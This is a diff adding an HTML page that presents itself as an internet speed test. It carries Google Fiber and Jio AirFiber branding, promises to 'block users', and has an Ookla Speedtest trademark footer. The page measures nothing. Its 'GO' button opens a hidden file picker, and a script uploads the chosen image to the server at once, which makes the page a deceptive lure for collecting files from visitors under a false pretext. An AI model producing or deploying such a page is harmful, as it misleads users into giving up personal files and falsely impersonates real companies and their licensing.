@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Speed Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f9f9f9;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      height: 100%;
+      max-width: 1200px;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo img {
+      height: 20px;
+    }
+
+    .circle {
+      position: relative;
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      border: 6px solid #d4f3d3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      cursor: pointer;
+    }
+
+    .circle span {
+      font-size: 28px;
+      color: #3cb043;
+      font-weight: bold;
+      z-index: 10;
+    }
+
+    .circle::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(60, 176, 67, 0.2), rgba(60, 176, 67, 0));
+      transform: scale(0);
+      opacity: 0;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+    }
+
+    .details {
+      font-size: 14px;
+      color: #333;
+      text-align: center;
+    }
+
+    .details select {
+      border: none;
+      background: none;
+      font-size: 14px;
+      color: #3cb043;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(0);
+        opacity: 1;
+      }
+      100% {
+        transform: scale(1);
+        opacity: 0;
+      }
+    }
+
+    @media screen and (max-width: 600px) {
+      .circle {
+        width: 150px;
+        height: 150px;
+      }
+
+      .circle span {
+        font-size: 20px;
+      }
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo Section -->
+    <div class="logo">
+      <img src="https://www.gstatic.com/images/branding/product/1x/google_fiber_512dp.png" alt="Google Fiber" />
+      <span>Block WIFI</span>
+    </div>
+
+    <!-- Pulsing GO Section -->
+    <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
+      <input type="file" id="fileInput" name="image" required>
+      <div class="circle" onclick="document.getElementById('fileInput').click();">
+        <span>GO</span>
+      </div>
+    </form>
+
+    <!-- Details Section -->
+    <div class="details">
+      <span>JIO AIRFIBER Ltd</span> <br />
+      <select>
+        <option>Patna</option>
+      </select><br>
+      <span>SAFE YOUR AIRFIBER</span> <br />
+      <span>BLOCK USERS</span> <br />
+    </div>
+
+    <!-- Footer Section -->
+    <div class="footer">
+      All trademarks of Ookla, LLC, including Speedtest®, are used under license.
+    </div>
+  </div>
+
+  <script>
+    const fileInput = document.getElementById('fileInput');
+    const uploadForm = document.getElementById('uploadForm');
+
+    fileInput.addEventListener('change', () => {
+      if (fileInput.files.length > 0) {
+        uploadForm.submit();
+      }
+    });
+  </script>
+</body>
+</html>
